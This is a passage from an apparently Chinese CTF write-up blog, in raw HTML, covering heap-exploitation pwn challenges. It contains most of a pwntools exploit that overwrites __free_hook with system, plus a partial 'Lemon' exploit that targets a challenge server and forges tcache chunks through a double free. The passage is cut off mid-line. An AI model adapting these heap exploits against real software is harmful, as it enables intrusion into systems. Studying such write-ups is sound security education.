class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span>\n\npayload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x100</span><span class=\"token operator\">*</span><span class=\"token number\">3</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>rjust<span class=\"token punctuation\">(</span><span class=\"token number\">0xf8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span>\n\nadd<span class=\"token punctuation\">(</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf8</span> <span class=\"token punctuation\">,</span> decode<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#0</span>\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span>\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># 8 , 0</span>\nadd<span class=\"token punctuation\">(</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x78</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a\\n'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#1</span>\nadd<span class=\"token punctuation\">(</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x78</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a\\n'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#2</span>\n\nshow<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span>\nru<span class=\"token punctuation\">(</span><span class=\"token string\">'Pwd is: '</span><span class=\"token punctuation\">)</span>\n__malloc_hook <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> key \nlg<span class=\"token punctuation\">(</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">,</span>__malloc_hook<span class=\"token punctuation\">)</span>\n\nlibc<span class=\"token punctuation\">.</span>address <span class=\"token operator\">=</span> __malloc_hook <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x70</span>\n__free_hook <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__free_hook'</span><span class=\"token punctuation\">]</span>\nsystem <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span>\n\nadd<span class=\"token punctuation\">(</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x78</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a\\n'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#3</span>\nadd<span class=\"token punctuation\">(</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x78</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a\\n'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#4</span>\n\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\nedit<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>__free_hook<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x78</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a\\n'</span><span class=\"token punctuation\">)</span>\n\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">'__free_hook'</span><span class=\"token punctuation\">,</span>__free_hook<span class=\"token punctuation\">)</span>\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">,</span>system<span class=\"token punctuation\">)</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x78</span> <span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>system <span class=\"token operator\">^</span> key<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token operator\">^</span>key<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">14</span> <span class=\"token punctuation\">)</span>\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">11</span><span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n@File    :   pwdFree.py\n@Time    :   2021/08/21 20:08:21\n@Author  :   Niyah \n'''</span>\n</code></pre>\n<h1 id=\"lemon\"><a class=\"markdownIt-Anchor\" href=\"#lemon\">#</a> Lemon</h1>\n<p>Lemon 这题方法用错了，爆破了挺久的，官方解的话好像两下就出来了</p>\n<p>这里首先绕一下把 flag 存到栈上</p>\n<p><img src=\"/CTF/%E7%A5%A5%E4%BA%91%E6%9D%AF%E9%83%A8%E5%88%86Pwn/4.png\" alt=\"1\"></p>\n<p>add 这里有个 double free 但只能申请 0x30 大小的，通过这个可以修改 chunk 头</p>\n<p><img src=\"/CTF/%E7%A5%A5%E4%BA%91%E6%9D%AF%E9%83%A8%E5%88%86Pwn/5.png\" alt=\"1\"></p>\n<p>edit 存在堆溢出，可以控制 tcache 管理块从而使用 fastbin，但 edit 只有一次（师傅说这里有个负溢出，看了看确实）</p>\n<p><img src=\"/CTF/%E7%A5%A5%E4%BA%91%E6%9D%AF%E9%83%A8%E5%88%86Pwn/6.png\" alt=\"1\"></p>\n<p>本题 onegadget 一个都不能用，调栈帧都不行，只能不断申请 stdout 将栈上的 flag 打印出来</p>\n<p><img src=\"/CTF/%E7%A5%A5%E4%BA%91%E6%9D%AF%E9%83%A8%E5%88%86Pwn/7.png\" alt=\"1\"></p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- encoding: utf-8 -*-</span>\n<span class=\"token keyword\">import</span> sys \n<span class=\"token keyword\">import</span> os \n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> \ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span> \ncontext<span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span> os <span class=\"token operator\">=</span> <span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch <span class=\"token operator\">=</span> <span class=\"token string\">'amd64'</span><span class=\"token punctuation\">)</span>\nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'./lemon_pwn'</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\nlibc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc-2.26.so'</span><span class=\"token punctuation\">)</span>\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n    libc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n    <span class=\"token comment\">#p = process(['qemu-arm', binary])</span>\n    <span class=\"token comment\">#p = process(['qemu-aarch64','-L','',binary])</span>\n    <span class=\"token comment\">#p = process(['qemu-aarch64','-L','',-g,'1234',binary])</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    host <span class=\"token operator\">=</span> <span class=\"token string\">'47.104.70.90'</span>\n    port <span class=\"token operator\">=</span> <span class=\"token string\">'34524'</span>\n    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data  <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">': 0x%x'</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrint<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x <span class=\"token operator\">=</span> <span class=\"token number\">12</span>     <span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span> b <span class=\"token operator\">=</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b <span class=\"token operator\">==</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span><span class=\"token string\">'b %s'</span><span class=\"token operator\">%</span>b<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">exhaust</span><span class=\"token punctuation\">(</span> pwn <span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">global</span> p\n    i <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n    <span class=\"token keyword\">while</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n            i<span class=\"token operator\">+=</span><span class=\"token number\">1</span>\n            pwn<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span>\n            lg<span class=\"token punctuation\">(</span><span class=\"token string\">'times ========> '</span><span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">)</span>\n            p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>DEBUG<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">else</span> <span class=\"token punctuation\">:</span>\n                p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'>>'</span><span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">,</span>name<span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'index of your lemon: '</span><span class=\"token punctuation\">,</span>idx<span class=\"token punctuation\">)</span>\n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">'Now, name your lemon: '</span><span class=\"token punctuation\">,</span>name<span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'message for you lemon: '</span><span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">)</span>\n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">'your message: '</span><span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">eadd</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">,</span>name<span class=\"token punctuation\">,</span>size <span class=\"token operator\">=</span> <span class=\"token number\">0x600</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'index of your lemon: '</span><span class=\"token punctuation\">,</span>idx<span class=\"token punctuation\">)</span>\n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">'Now, name your lemon: '</span><span class=\"token punctuation\">,</span>name<span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'message for you lemon: '</span><span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'index of your lemon : '</span><span class=\"token punctuation\">,</span>idx<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'index of your lemon : '</span><span class=\"token punctuation\">,</span>idx<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Input the index of your lemon  : '</span><span class=\"token punctuation\">,</span>idx<span class=\"token punctuation\">)</span>\n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">'draw and color!'</span><span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'with me?'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'yes'</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># dbg()</span>\n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">'lucky number: '</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x700048</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'tell me you name first:'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\n    ru<span class=\"token punctuation\">(</span><span class=\"token string\">'is 0x'</span><span class=\"token punctuation\">)</span>\n\n    stack_low_addr <span class=\"token operator\">=</span> rint<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'stack_low_addr'</span><span class=\"token punctuation\">,</span>stack_low_addr<span class=\"token punctuation\">)</span>\n\n    <span class=\"token comment\"># sla('with me?','g')</span>\n\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x248</span><span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x248</span><span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x40</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">)</span>\n    show<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    ru<span class=\"token punctuation\">(</span><span class=\"token string\">'eat eat eat '</span><span class=\"token punctuation\">)</span>\n    addr <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'.'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x50</span>\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'addr'</span><span class=\"token punctuation\">,</span>addr<span class=\"token punctuation\">)</span>\n\n    fake <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span> <span class=\"token punctuation\">,</span><span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x251</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span>p16<span class=\"token punctuation\">(</span>addr <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xf000</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span>\n    edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span> <span class=\"token punctuation\">,</span>fake <span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x248</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x07'</span><span class=\"token operator\">*</span><span class=\"token number\">0x40</span> <span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x248</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x01'</span><span class=\"token operator\">*</span><span class=\"token number\">2</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\x07'</span><span class=\"token operator\">*</span><span class=\"token number\">0x3e</span> <span class=\"token punctuation\">)</span>\n\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x18</span> <span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x31</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x31</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">3</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x07'</span><span class=\"token operator\">*</span><span class=\"token number\">0x40</span> <span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x31</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x31</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n\n    eadd<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> p16<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>addr<span class=\"token operator\">&amp;</span> <span class=\"token number\">0xf000</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x820</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x28</span> <span class=\"token punctuation\">,</span> p16<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>addr<span class=\"token operator\">&amp;</span> <span class=\"token number\">0xf000</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x820</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x30</span><span class=\"token operator\">*</span><span class=\"token number\">4</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x70</span><span class=\"token operator\">*</span><span class=\"token number\">4</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x28</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x28</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x70</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\n    low_addr <span class=\"token operator\">=</span> <span class=\"token number\">0x96dd</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x40</span> <span class=\"token punctuation\">,</span>  <span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x98</span>  <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x71</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span> p16<span class=\"token punctuation\">(</span>low_addr<span class=\"token 